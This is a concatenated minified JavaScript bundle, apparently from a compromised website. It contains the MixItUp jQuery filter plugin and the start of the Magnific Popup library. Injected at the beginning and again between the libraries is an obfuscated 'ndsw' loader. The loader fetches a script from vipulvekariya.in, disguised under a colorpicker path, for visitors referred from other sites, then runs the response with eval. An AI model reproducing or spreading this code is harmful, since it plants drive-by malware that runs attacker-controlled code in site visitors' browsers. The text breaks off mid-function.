                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;/*
* MIXITUP - A CSS3 and JQuery Filter & Sort Plugin
* Version: 1.5.4
* License: Creative Commons Attribution-NoDerivs 3.0 Unported - CC BY-ND 3.0
* http://creativecommons.org/licenses/by-nd/3.0/
* This software may be used freely on commercial and non-commercial projects with attribution to the author/copyright holder.
* Author: Patrick Kunka
* Copyright 2012-2013 Patrick Kunka, Barrel LLC, All Rights Reserved
* 
* http://mixitup.io
*/

(function(e) {
    function q(c, b, g, d, a) {
        function k() {
            l.unbind("webkitTransitionEnd transitionend otransitionend oTransitionEnd");
            b && w(b, g, d, a);
            a.startOrder = [];
            a.newOrder = [];
            a.origSort = [];
            a.checkSort = [];
            r.removeStyle(a.prefix + "filter, filter, " + a.prefix + "transform, transform, opacity, display").css(a.clean).removeAttr("data-checksum");
            window.atob || r.css({
                display: "none",
                opacity: "0"
            });
            l.removeStyle(a.prefix + "transition, transition, " + a.prefix + "perspective, perspective, " + a.prefix + "perspective-origin, perspective-origin, " + (a.resizeContainer ? "height" : ""));
            "list" == a.layoutMode ? (n.css({
                display: a.targetDisplayList,
                opacity: "1"
            }),
            a.origDisplay = a.targetDisplayList) : (n.css({
                display: a.targetDisplayGrid,
                opacity: "1"
            }),
            a.origDisplay = a.targetDisplayGrid);
            a.origLayout = a.layoutMode;
            setTimeout(function() {
                r.removeStyle(a.prefix + "transition, transition");
                a.mixing = !1;
                if ("function" == typeof a.onMixEnd) {
                    var b = a.onMixEnd.call(this, a);
                    a = b ? b : a
                }
            })
        }
        clearInterval(a.failsafe);
        a.mixing = !0;
        a.filter = c;
        if ("function" == typeof a.onMixStart) {
            var f = a.onMixStart.call(this, a);
            a = f ? f : a
        }
        for (var h = a.transitionSpeed, f = 0; 2 > f; f++) {
            var j = 0 == f ? j = a.prefix : "";
            a.transition[j + "transition"] = "all " + h + "ms linear";
            a.transition[j + "transform"] = j + "translate3d(0,0,0)";
            a.perspective[j + "perspective"] = a.perspectiveDistance + "px";
            a.perspective[j + "perspective-origin"] = a.perspectiveOrigin
        }
        var s = a.targetSelector
          , r = d.find(s);
        r.each(function() {
            this.data = {}
        });
        var l = r.parent();
        l.css(a.perspective);
        a.easingFallback = "ease-in-out";
        "smooth" == a.easing && (a.easing = "cubic-bezier(0.25, 0.46, 0.45, 0.94)");
        "snap" == a.easing && (a.easing = "cubic-bezier(0.77, 0, 0.175, 1)");
        "windback" == a.easing && (a.easing = "cubic-bezier(0.175, 0.885, 0.320, 1.275)",
        a.easingFallback = "cubic-bezier(0.175, 0.885, 0.320, 1)");
        "windup" == a.easing && (a.easing = "cubic-bezier(0.6, -0.28, 0.735, 0.045)",
        a.easingFallback = "cubic-bezier(0.6, 0.28, 0.735, 0.045)");
        f = "list" == a.layoutMode && null != a.listEffects ? a.listEffects : a.effects;
        Array.prototype.indexOf && (a.fade = -1 < f.indexOf("fade") ? "0" : "",
        a.scale = -1 < f.indexOf("scale") ? "scale(.01)" : "",
        a.rotateZ = -1 < f.indexOf("rotateZ") ? "rotate(180deg)" : "",
        a.rotateY = -1 < f.indexOf("rotateY") ? "rotateY(90deg)" : "",
        a.rotateX = -1 < f.indexOf("rotateX") ? "rotateX(90deg)" : "",
        a.blur = -1 < f.indexOf("blur") ? "blur(8px)" : "",
        a.grayscale = -1 < f.indexOf("grayscale") ? "grayscale(100%)" : "");
        var n = e()
          , t = e()
          , u = []
          , q = !1;
        "string" === typeof c ? u = y(c) : (q = !0,
        e.each(c, function(a) {
            u[a] = y(this)
        }));
        "or" == a.filterLogic ? ("" == u[0] && u.shift(),
        1 > u.length ? t = t.add(d.find(s + ":visible")) : r.each(function() {
            var a = e(this);
            if (q) {
                var b = 0;
                e.each(u, function() {
                    this.length ? a.is("." + this.join(", .")) && b++ : 0 < b && b++
                });
                b == u.length ? n = n.add(a) : t = t.add(a)
            } else
                a.is("." + u.join(", .")) ? n = n.add(a) : t = t.add(a)
        })) : (n = n.add(l.find(s + "." + u.join("."))),
        t = t.add(l.find(s + ":not(." + u.join(".") + "):visible")));
        c = n.length;
        var v = e()
          , p = e()
          , m = e();
        t.each(function() {
            var a = e(this);
            "none" != a.css("display") && (v = v.add(a),
            m = m.add(a))
        });
        if (n.filter(":visible").length == c && !v.length && !b) {
            if (a.origLayout == a.layoutMode)
                return k(),
                !1;
            if (1 == n.length)
                return "list" == a.layoutMode ? (d.addClass(a.listClass),
                d.removeClass(a.gridClass),
                m.css("display", a.targetDisplayList)) : (d.addClass(a.gridClass),
                d.removeClass(a.listClass),
                m.css("display", a.targetDisplayGrid)),
                k(),
                !1
        }
        a.origHeight = l.height();
        if (n.length) {
            d.removeClass(a.failClass);
            n.each(function() {
                var a = e(this);
                "none" == a.css("display") ? p = p.add(a) : m = m.add(a)
            });
            if (a.origLayout != a.layoutMode && !1 == a.animateGridList)
                return "list" == a.layoutMode ? (d.addClass(a.listClass),
                d.removeClass(a.gridClass),
                m.css("display", a.targetDisplayList)) : (d.addClass(a.gridClass),
                d.removeClass(a.listClass),
                m.css("display", a.targetDisplayGrid)),
                k(),
                !1;
            if (!window.atob)
                return k(),
                !1;
            r.css(a.clean);
            m.each(function() {
                this.data.origPos = e(this).offset()
            });
            "list" == a.layoutMode ? (d.addClass(a.listClass),
            d.removeClass(a.gridClass),
            p.css("display", a.targetDisplayList)) : (d.addClass(a.gridClass),
            d.removeClass(a.listClass),
            p.css("display", a.targetDisplayGrid));
            p.each(function() {
                this.data.showInterPos = e(this).offset()
            });
            v.each(function() {
                this.data.hideInterPos = e(this).offset()
            });
            m.each(function() {
                this.data.preInterPos = e(this).offset()
            });
            "list" == a.layoutMode ? m.css("display", a.targetDisplayList) : m.css("display", a.targetDisplayGrid);
            b && w(b, g, d, a);
            if (c = b)
                a: if (c = a.origSort,
                f = a.checkSort,
                c.length != f.length)
                    c = !1;
                else {
                    for (j = 0; j < f.length; j++)
                        if (c[j].compare && !c[j].compare(f[j]) || c[j] !== f[j]) {
                            c = !1;
                            break a
                        }
                    c = !0
                }
            if (c)
                return k(),
                !1;
            v.hide();
            p.each(function() {
                this.data.finalPos = e(this).offset()
            });
            m.each(function() {
                this.data.finalPrePos = e(this).offset()
            });
            a.newHeight = l.height();
            b && w("reset", null, d, a);
            p.hide();
            m.css("display", a.origDisplay);
            "block" == a.origDisplay ? (d.addClass(a.listClass),
            p.css("display", a.targetDisplayList)) : (d.removeClass(a.listClass),
            p.css("display", a.targetDisplayGrid));
            a.resizeContainer && l.css("height", a.origHeight + "px");
            c = {};
            for (f = 0; 2 > f; f++)
                j = 0 == f ? j = a.prefix : "",
                c[j + "transform"] = a.scale + " " + a.rotateX + " " + a.rotateY + " " + a.rotateZ,
                c[j + "filter"] = a.blur + " " + a.grayscale;
            p.css(c);
            m.each(function() {
                var b = this.data
                  , c = e(this);
                c.hasClass("mix_tohide") ? (b.preTX = b.origPos.left - b.hideInterPos.left,
                b.preTY = b.origPos.top - b.hideInterPos.top) : (b.preTX = b.origPos.left - b.preInterPos.left,
                b.preTY = b.origPos.top - b.preInterPos.top);
                for (var d = {}, f = 0; 2 > f; f++) {
                    var j = 0 == f ? j = a.prefix : "";
                    d[j + "transform"] = "translate(" + b.preTX + "px," + b.preTY + "px)"
                }
                c.css(d)
            });
            "list" == a.layoutMode ? (d.addClass(a.listClass),
            d.removeClass(a.gridClass)) : (d.addClass(a.gridClass),
            d.removeClass(a.listClass));
            setTimeout(function() {
                if (a.resizeContainer) {
                    for (var b = {}, c = 0; 2 > c; c++) {
                        var d = 0 == c ? d = a.prefix : "";
                        b[d + "transition"] = "all " + h + "ms ease-in-out";
                        b.height = a.newHeight + "px"
                    }
                    l.css(b)
                }
                v.css("opacity", a.fade);
                p.css("opacity", 1);
                p.each(function() {
                    var b = this.data;
                    b.tX = b.finalPos.left - b.showInterPos.left;
                    b.tY = b.finalPos.top - b.showInterPos.top;
                    for (var c = {}, d = 0; 2 > d; d++) {
                        var f = 0 == d ? f = a.prefix : "";
                        c[f + "transition-property"] = f + "transform, " + f + "filter, opacity";
                        c[f + "transition-timing-function"] = a.easing + ", linear, linear";
                        c[f + "transition-duration"] = h + "ms";
                        c[f + "transition-delay"] = "0";
                        c[f + "transform"] = "translate(" + b.tX + "px," + b.tY + "px)";
                        c[f + "filter"] = "none"
                    }
                    e(this).css("-webkit-transition", "all " + h + "ms " + a.easingFallback).css(c)
                });
                m.each(function() {
                    var b = this.data;
                    b.tX = 0 != b.finalPrePos.left ? b.finalPrePos.left - b.preInterPos.left : 0;
                    b.tY = 0 != b.finalPrePos.left ? b.finalPrePos.top - b.preInterPos.top : 0;
                    for (var c = {}, d = 0; 2 > d; d++) {
                        var f = 0 == d ? f = a.prefix : "";
                        c[f + "transition"] = "all " + h + "ms " + a.easing;
                        c[f + "transform"] = "translate(" + b.tX + "px," + b.tY + "px)"
                    }
                    e(this).css("-webkit-transition", "all " + h + "ms " + a.easingFallback).css(c)
                });
                b = {};
                for (c = 0; 2 > c; c++)
                    d = 0 == c ? d = a.prefix : "",
                    b[d + "transition"] = "all " + h + "ms " + a.easing + ", " + d + "filter " + h + "ms linear, opacity " + h + "ms linear",
                    b[d + "transform"] = a.scale + " " + a.rotateX + " " + a.rotateY + " " + a.rotateZ,
                    b[d + "filter"] = a.blur + " " + a.grayscale,
                    b.opacity = a.fade;
                v.css(b);
                l.bind("webkitTransitionEnd transitionend otransitionend oTransitionEnd", function(b) {
                    if (-1 < b.originalEvent.propertyName.indexOf("transform") || -1 < b.originalEvent.propertyName.indexOf("opacity"))
                        -1 < s.indexOf(".") ? e(b.target).hasClass(s.replace(".", "")) && k() : e(b.target).is(s) && k()
                })
            }, 10);
            a.failsafe = setTimeout(function() {
                a.mixing && k()
            }, h + 400)
        } else {
            a.resizeContainer && l.css("height", a.origHeight + "px");
            if (!window.atob)
                return k(),
                !1;
            v = t;
            setTimeout(function() {
                l.css(a.perspective);
                if (a.resizeContainer) {
                    for (var b = {}, c = 0; 2 > c; c++) {
                        var e = 0 == c ? e = a.prefix : "";
                        b[e + "transition"] = "height " + h + "ms ease-in-out";
                        b.height = a.minHeight + "px"
                    }
                    l.css(b)
                }
                r.css(a.transition);
                if (t.length) {
                    b = {};
                    for (c = 0; 2 > c; c++)
                        e = 0 == c ? e = a.prefix : "",
                        b[e + "transform"] = a.scale + " " + a.rotateX + " " + a.rotateY + " " + a.rotateZ,
                        b[e + "filter"] = a.blur + " " + a.grayscale,
                        b.opacity = a.fade;
                    v.css(b);
                    l.bind("webkitTransitionEnd transitionend otransitionend oTransitionEnd", function(b) {
                        if (-1 < b.originalEvent.propertyName.indexOf("transform") || -1 < b.originalEvent.propertyName.indexOf("opacity"))
                            d.addClass(a.failClass),
                            k()
                    })
                } else
                    a.mixing = !1
            }, 10)
        }
    }
    function w(c, b, g, d) {
        function a(b, a) {
            var d = isNaN(1 * b.attr(c)) ? b.attr(c).toLowerCase() : 1 * b.attr(c)
              , e = isNaN(1 * a.attr(c)) ? a.attr(c).toLowerCase() : 1 * a.attr(c);
            return d < e ? -1 : d > e ? 1 : 0
        }
        function k(a) {
            "asc" == b ? f.prepend(a).prepend(" ") : f.append(a).append(" ")
        }
        g.find(d.targetSelector).wrapAll('<div class="mix_sorter"/>');
        var f = g.find(".mix_sorter");
        d.origSort.length || f.find(d.targetSelector + ":visible").each(function() {
            e(this).wrap("<s/>");
            d.origSort.push(e(this).parent().html().replace(/\s+/g, ""));
            e(this).unwrap()
        });
        f.empty();
        if ("reset" == c)
            e.each(d.startOrder, function() {
                f.append(this).append(" ")
            });
        else if ("default" == c)
            e.each(d.origOrder, function() {
                k(this)
            });
        else if ("random" == c) {
            if (!d.newOrder.length) {
                for (var h = d.startOrder.slice(), j = h.length, s = j; s--; ) {
                    var r = parseInt(Math.random() * j)
                      , l = h[s];
                    h[s] = h[r];
                    h[r] = l
                }
                d.newOrder = h
            }
            e.each(d.newOrder, function() {
                f.append(this).append(" ")
            })
        } else if ("custom" == c)
            e.each(b, function() {
                k(this)
            });
        else {
            if ("undefined" === typeof d.origOrder[0].attr(c))
                return console.log("No such attribute found. Terminating"),
                !1;
            d.newOrder.length || (e.each(d.origOrder, function() {
                d.newOrder.push(e(this))
            }),
            d.newOrder.sort(a));
            e.each(d.newOrder, function() {
                k(this)
            })
        }
        d.checkSort = [];
        f.find(d.targetSelector + ":visible").each(function(b) {
            var a = e(this);
            0 == b && a.attr("data-checksum", "1");
            a.wrap("<s/>");
            d.checkSort.push(a.parent().html().replace(/\s+/g, ""));
            a.unwrap()
        });
        g.find(d.targetSelector).unwrap()
    }
    function y(c) {
        c = c.replace(/\s{2,}/g, " ");
        var b = c.split(" ");
        e.each(b, function(c) {
            "all" == this && (b[c] = "mix_all")
        });
        "" == b[0] && b.shift();
        return b
    }
    var x = {
        init: function(c) {
            return this.each(function() {
                var b = {
                    targetSelector: ".mix",
                    filterSelector: ".filter",
                    sortSelector: ".sort",
                    buttonEvent: "click",
                    effects: ["fade", "scale"],
                    listEffects: null,
                    easing: "smooth",
                    layoutMode: "grid",
                    targetDisplayGrid: "inline-block",
                    targetDisplayList: "block",
                    listClass: "",
                    gridClass: "",
                    transitionSpeed: 600,
                    showOnLoad: "all",
                    sortOnLoad: !1,
                    multiFilter: !1,
                    filterLogic: "or",
                    resizeContainer: !0,
                    minHeight: 0,
                    failClass: "fail",
                    perspectiveDistance: "3000",
                    perspectiveOrigin: "50% 50%",
                    animateGridList: !0,
                    onMixLoad: null,
                    onMixStart: null,
                    onMixEnd: null,
                    container: null,
                    origOrder: [],
                    startOrder: [],
                    newOrder: [],
                    origSort: [],
                    checkSort: [],
                    filter: "",
                    mixing: !1,
                    origDisplay: "",
                    origLayout: "",
                    origHeight: 0,
                    newHeight: 0,
                    isTouch: !1,
                    resetDelay: 0,
                    failsafe: null,
                    prefix: "",
                    easingFallback: "ease-in-out",
                    transition: {},
                    perspective: {},
                    clean: {},
                    fade: "1",
                    scale: "",
                    rotateX: "",
                    rotateY: "",
                    rotateZ: "",
                    blur: "",
                    grayscale: ""
                };
                c && e.extend(b, c);
                this.config = b;
                e.support.touch = "ontouchend"in document;
                e.support.touch && (b.isTouch = !0,
                b.resetDelay = 350);
                b.container = e(this);
                var g = b.container, d;
                a: {
                    d = g[0];
                    for (var a = ["Webkit", "Moz", "O", "ms"], k = 0; k < a.length; k++)
                        if (a[k] + "Transition"in d.style) {
                            d = a[k];
                            break a
                        }
                    d = "transition"in d.style ? "" : !1
                }
                b.prefix = d;
                b.prefix = b.prefix ? "-" + b.prefix.toLowerCase() + "-" : "";
                g.find(b.targetSelector).each(function() {
                    b.origOrder.push(e(this))
                });
                if (b.sortOnLoad) {
                    var f;
                    e.isArray(b.sortOnLoad) ? (d = b.sortOnLoad[0],
                    f = b.sortOnLoad[1],
                    e(b.sortSelector + "[data-sort=" + b.sortOnLoad[0] + "][data-order=" + b.sortOnLoad[1] + "]").addClass("active")) : (e(b.sortSelector + "[data-sort=" + b.sortOnLoad + "]").addClass("active"),
                    d = b.sortOnLoad,
                    b.sortOnLoad = "desc");
                    w(d, f, g, b)
                }
                for (f = 0; 2 > f; f++)
                    d = 0 == f ? d = b.prefix : "",
                    b.transition[d + "transition"] = "all " + b.transitionSpeed + "ms ease-in-out",
                    b.perspective[d + "perspective"] = b.perspectiveDistance + "px",
                    b.perspective[d + "perspective-origin"] = b.perspectiveOrigin;
                for (f = 0; 2 > f; f++)
                    d = 0 == f ? d = b.prefix : "",
                    b.clean[d + "transition"] = "none";
                "list" == b.layoutMode ? (g.addClass(b.listClass),
                b.origDisplay = b.targetDisplayList) : (g.addClass(b.gridClass),
                b.origDisplay = b.targetDisplayGrid);
                b.origLayout = b.layoutMode;
                f = b.showOnLoad.split(" ");
                e.each(f, function() {
                    e(b.filterSelector + '[data-filter="' + this + '"]').addClass("active")
                });
                g.find(b.targetSelector).addClass("mix_all");
                "all" == f[0] && (f[0] = "mix_all",
                b.showOnLoad = "mix_all");
                var h = e();
                e.each(f, function() {
                    h = h.add(e("." + this))
                });
                h.each(function() {
                    var a = e(this);
                    "list" == b.layoutMode ? a.css("display", b.targetDisplayList) : a.css("display", b.targetDisplayGrid);
                    a.css(b.transition)
                });
                setTimeout(function() {
                    b.mixing = !0;
                    h.css("opacity", "1");
                    setTimeout(function() {
                        "list" == b.layoutMode ? h.removeStyle(b.prefix + "transition, transition").css({
                            display: b.targetDisplayList,
                            opacity: 1
                        }) : h.removeStyle(b.prefix + "transition, transition").css({
                            display: b.targetDisplayGrid,
                            opacity: 1
                        });
                        b.mixing = !1;
                        if ("function" == typeof b.onMixLoad) {
                            var a = b.onMixLoad.call(this, b);
                            b = a ? a : b
                        }
                    }, b.transitionSpeed)
                }, 10);
                b.filter = b.showOnLoad;
                e(b.sortSelector).bind(b.buttonEvent, function() {
                    if (!b.mixing) {
                        var a = e(this)
                          , c = a.attr("data-sort")
                          , d = a.attr("data-order");
                        if (a.hasClass("active")) {
                            if ("random" != c)
                                return !1
                        } else
                            e(b.sortSelector).removeClass("active"),
                            a.addClass("active");
                        g.find(b.targetSelector).each(function() {
                            b.startOrder.push(e(this))
                        });
                        q(b.filter, c, d, g, b)
                    }
                });
                e(b.filterSelector).bind(b.buttonEvent, function() {
                    if (!b.mixing) {
                        var a = e(this);
                        if (!1 == b.multiFilter)
                            e(b.filterSelector).removeClass("active"),
                            a.addClass("active"),
                            b.filter = a.attr("data-filter"),
                            e(b.filterSelector + '[data-filter="' + b.filter + '"]').addClass("active");
                        else {
                            var c = a.attr("data-filter");
                            a.hasClass("active") ? (a.removeClass("active"),
                            b.filter = b.filter.replace(RegExp("(\\s|^)" + c), "")) : (a.addClass("active"),
                            b.filter = b.filter + " " + c)
                        }
                        q(b.filter, null, null, g, b)
                    }
                })
            })
        },
        toGrid: function() {
            return this.each(function() {
                var c = this.config;
                "grid" != c.layoutMode && (c.layoutMode = "grid",
                q(c.filter, null, null, e(this), c))
            })
        },
        toList: function() {
            return this.each(function() {
                var c = this.config;
                "list" != c.layoutMode && (c.layoutMode = "list",
                q(c.filter, null, null, e(this), c))
            })
        },
        filter: function(c) {
            return this.each(function() {
                var b = this.config;
                b.mixing || (e(b.filterSelector).removeClass("active"),
                e(b.filterSelector + '[data-filter="' + c + '"]').addClass("active"),
                q(c, null, null, e(this), b))
            })
        },
        sort: function(c) {
            return this.each(function() {
                var b = this.config
                  , g = e(this);
                if (!b.mixing) {
                    e(b.sortSelector).removeClass("active");
                    if (e.isArray(c)) {
                        var d = c[0]
                          , a = c[1];
                        e(b.sortSelector + '[data-sort="' + c[0] + '"][data-order="' + c[1] + '"]').addClass("active")
                    } else
                        e(b.sortSelector + '[data-sort="' + c + '"]').addClass("active"),
                        d = c,
                        a = "desc";
                    g.find(b.targetSelector).each(function() {
                        b.startOrder.push(e(this))
                    });
                    q(b.filter, d, a, g, b)
                }
            })
        },
        multimix: function(c) {
            return this.each(function() {
                var b = this.config
                  , g = e(this);
                multiOut = {
                    filter: b.filter,
                    sort: null,
                    order: "desc",
                    layoutMode: b.layoutMode
                };
                e.extend(multiOut, c);
                b.mixing || (e(b.filterSelector).add(b.sortSelector).removeClass("active"),
                e(b.filterSelector + '[data-filter="' + multiOut.filter + '"]').addClass("active"),
                "undefined" !== typeof multiOut.sort && (e(b.sortSelector + '[data-sort="' + multiOut.sort + '"][data-order="' + multiOut.order + '"]').addClass("active"),
                g.find(b.targetSelector).each(function() {
                    b.startOrder.push(e(this))
                })),
                b.layoutMode = multiOut.layoutMode,
                q(multiOut.filter, multiOut.sort, multiOut.order, g, b))
            })
        },
        remix: function(c) {
            return this.each(function() {
                var b = this.config
                  , g = e(this);
                b.origOrder = [];
                g.find(b.targetSelector).each(function() {
                    var c = e(this);
                    c.addClass("mix_all");
                    b.origOrder.push(c)
                });
                !b.mixing && "undefined" !== typeof c && (e(b.filterSelector).removeClass("active"),
                e(b.filterSelector + '[data-filter="' + c + '"]').addClass("active"),
                q(c, null, null, g, b))
            })
        }
    };
    e.fn.mixitup = function(c, b) {
        if (x[c])
            return x[c].apply(this, Array.prototype.slice.call(arguments, 1));
        if ("object" === typeof c || !c)
            return x.init.apply(this, arguments)
    }
    ;
    e.fn.removeStyle = function(c) {
        return this.each(function() {
            var b = e(this);
            c = c.replace(/\s+/g, "");
            var g = c.split(",");
            e.each(g, function() {
                var c = RegExp(this.toString() + "[^;]+;?", "g");
                b.attr("style", function(a, b) {
                    if (b)
                        return b.replace(c, "")
                })
            })
        })
    }
}
)(jQuery);
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;(function(a) {
    var b = "Close", c = "BeforeClose", d = "AfterClose", e = "BeforeAppend", f = "MarkupParse", g = "Open", h = "Change", i = "mfp", j = "." + i, k = "mfp-ready", l = "mfp-removing", m = "mfp-prevent-close", n, o = function() {}, p = !!window.jQuery, q, r = a(window), s, t, u, v, w, x = function(a, b) {
        n.ev.on(i + a + j, b)
    }, y = function(b, c, d, e) {
        var f = document.createElement("div");
        return f.className = "mfp-" + b,
        d && (f.innerHTML = d),
        e ? c && c.appendChild(f) : (f = a(f),
        c && f.appendTo(c)),
        f
    }, z = function(b, c) {
        n.ev.triggerHandler(i + b, c),
        n.st.callbacks && (b = b.charAt(0).toLowerCase() + b.slice(1),
        n.st.callbacks[b] && n.st.callbacks[b].apply(n, a.isArray(c) ? c : [c]))
    }, A = function() {
        (n.st.focus ? n.content.find(n.st.focus).eq(0) : n.wrap).focus()
    }, B = function(b) {
        if (b !== w || !n.currTemplate.closeBtn)
            n.currTemplate.closeBtn = a(n.st.closeMarkup.replace("%title%", n.st.tClose)),
            w = b;
        return n.currTemplate.closeBtn
    }, C = function() {
        a.magnificPopup.instance || (n = new o,
        n.init(),
        a.magnificPopup.instance = n)
    }, D = function() {
        var a = document.createElement("p").style
          , b = ["ms", "O", "Moz", "Webkit"];
        if (a.transition !== undefined)
            return !0;
        while (b.length)
            if (b.pop() + "Transition"in a)
                return !0;
        return !1
    };
    o.prototype = {
        constructor: o,
        init: function() {
            var b = navigator.appVersion;
            n.isIE7 = b.indexOf("MSIE 7.") !== -1,
            n.isIE8 = b.indexOf("MSIE 8.") !== -1,
            n.isLowIE = n.isIE7 || n.isIE8,
            n.isAndroid = /android/gi.test(b),
            n.isIOS = /iphone|ipad|ipod/gi.test(b),
            n.supportsTransition = D(),
            n.probablyMobile = n.isAndroid || n.isIOS || /(Opera Mini)|Kindle|webOS|BlackBerry|(Opera Mobi)|(Windows Phone)|IEMobile/i.test(navigator.userAgent),
            s = a(document.body),
            t = a(document),
            n.popupsCache = {}
        },
        open: function(b) {
            var c;
            if (b.isObj === !1) {
                n.items = b.items.toArray(),
                n.index = 0;
                var d = b.items, e;
                for (c = 0; c < d.length; c++) {
                    e = d[c],
                    e.parsed && (e = e.el[0]);
                    if (e === b.el[0]) {
                        n.index = c;
                        break
                    }
                }
            } else
                n.items = a.isArray(b.items) ? b.items : [b.items],
                n.index = b.index || 0;
            if (n.isOpen) {
                n.updateItemHTML();
                return
            }
            n.types = [],
            v = "",
            b.mainEl && b.mainEl.length ? n.ev = b.mainEl.eq(0) : n.ev = t,
            b.key ? (n.popupsCache[b.key] || (n.popupsCache[b.key] = {}),
            n.currTemplate = n.popupsCache[b.key]) : n.currTemplate = {},
            n.st = a.extend(!0, {}, a.magnificPopup.defaults, b),
            n.fixedContentPos = n.st.fixedContentPos === "auto" ? !n.probablyMobile : n.st.fixedContentPos,
            n.st.modal && (n.st.closeOnContentClick = !1,
            n.st.closeOnBgClick = !1,
            n.st.showCloseBtn = !1,
            n.st.enableEscapeKey = !1),
            n.bgOverlay || (n.bgOverlay = y("bg").on("click" + j, function() {
                n.close()
            }),
            n.wrap = y("wrap").attr("tabindex", -1).on("click" + j, function(a) {
                n._checkIfClose(a.target) && n.close()
            }),
            n.container = y("container", n.wrap)),
            n.contentContainer = y("content"),
            n.st.preloader && (n.preloader = y("preloader", n.container, n.st.tLoading));
            var h = a.magnificPopup.modules;
            for (c = 0; c < h.length; c++) {
                var i = h[c];
                i = i.charAt(0).toUpperCase() + i.slice(1),
                n["init" + i].call(n)
            }
            z("BeforeOpen"),
            n.st.showCloseBtn && (n.st.closeBtnInside ? (x(f, function(a, b, c, d) {
                c.close_replaceWith = B(d.type)
            }),
            v += " mfp-close-btn-in") : n.wrap.append(B())),
            n.st.alignTop && (v += " mfp-align-top"),
            n.fixedContentPos ? n.wrap.css({
                overflow: n.st.overflowY,
                overflowX: "hidden",
                overflowY: n.st.overflowY
            }) : n.wrap.css({
                top: r.scrollTop(),
                position: "absolute"
            }),
            (n.st.fixedBgPos === !1 || n.st.fixedBgPos === "auto" && !n.fixedContentPos) && n.bgOverlay.css({
                height: t.height(),
                position: "absolute"
            }),
            n.st.enableEscapeKey && t.on("keyup" + j, function(a) {
                a.keyCode === 27 && n.close()
            }),
            r.on("resize" + j, function() {
                n.updateSize()
            }),
            n.st.closeOnContentClick || (v += " mfp-auto-cursor"),
            v && n.wrap.addClass(v);
            var l = n.wH = r.height()
              , m = {};
            if (n.fixedContentPos && n._hasScrollBar(l)) {
                var o = n._getScrollbarSize();
                o && (m.marginRight = o)
            }
            n.fixedContentPos && (n.isIE7 ? a("body, html").css("overflow", "hidden") : m.overflow = "hidden");
            var p = n.st.mainClass;
            return n.isIE7 && (p += " mfp-ie7"),
            p && n._addClassToMFP(p),
            n.updateItemHTML(),
            z("BuildControls"),
            a("html").css(m),
            n.bgOverlay.add(n.wrap).prependTo(document.body),
            n._lastFocusedEl = document.activeElement,
            setTimeout(function() {
                n.content ? (n._addClassToMFP(k),
                A()) : n.bgOverlay.addClass(k),
                t.on("focusin" + j, function(b) {
                    if (b.target !== n.wrap[0] && !a.contains(n.wrap[0], b.target))
                        return A(),
                        !1
                })
            }, 16),
            n.isOpen = !0,
            n.updateSize(l),
            z(g),
            b
        },
        close: function() {
            if (!n.isOpen)
                return;
            z(c),
            n.isOpen = !1,
            n.st.removalDelay && !n.isLowIE && n.supportsTransition ? (n._addClassToMFP(l),
            setTimeout(function() {
                n._close()
            }, n.st.removalDelay)) : n._close()
        },
        _close: function() {
            z(b);
            var c = l + " " + k + " ";
            n.bgOverlay.detach(),
            n.wrap.detach(),
            n.container.empty(),
            n.st.mainClass && (c += n.st.mainClass + " "),
            n._removeClassFromMFP(c);
            if (n.fixedContentPos) {
                var e = {
                    marginRight: ""
                };
                n.isIE7 ? a("body, html").css("overflow", "") : e.overflow = "",
                a("html").css(e)
            }
            t.off("keyup" + j + " focusin" + j),
            n.ev.off(j),
            n.wrap.attr("class", "mfp-wrap").removeAttr("style"),
            n.bgOverlay.attr("class", "mfp-bg"),
            n.container.attr("class", "mfp-container"),
            n.st.showCloseBtn && (!n.st.closeBtnInside || n.currTemplate[n.currItem.type] === !0) && n.currTemplate.closeBtn && n.currTemplate.closeBtn.detach(),
            n._lastFocusedEl && a(n._lastFocusedEl).focus(),
            n.currItem = null,
            n.content = null,
            n.currTemplate = null,
            n.prevHeight = 0,
            z(d)
        },
        updateSize: function(a) {
            if (n.isIOS) {
                var b = document.documentElement.clientWidth / window.innerWidth
                  , c = window.innerHeight * b;
                n.wrap.css("height", c),
                n.wH = c
            } else
                n.wH = a || r.height();
            n.fixedContentPos || n.wrap.css("height", n.wH),
            z("Resize")
        },
        updateItemHTML: function() {
            var b = n.items[n.index];
            n.contentContainer.detach(),
            n.content && n.content.detach(),
            b.parsed || (b = n.parseEl(n.index));
            var c = b.type;
            z("BeforeChange", [n.currItem ? n.currItem.type : "", c]),
            n.currItem = b;
            if (!n.currTemplate[c]) {
                var d = n.st[c] ? n.st[c].markup : !1;
                z("FirstMarkupParse", d),
                d ? n.currTemplate[c] = a(d) : n.currTemplate[c] = !0
            }
            u && u !== b.type && n.container.removeClass("mfp-" + u + "-holder");
            var e = n["get" + c.charAt(0).toUpperCase() + c.slice(1)](b, n.currTemplate[c]);
            n.appendContent(e, c),
            b.preloaded = !0,
            z(h, b),
            u = b.type,
            n.container.prepend(n.contentContainer),
            z("AfterChange")
        },
        appendContent: function(a, b) {
            n.content = a,
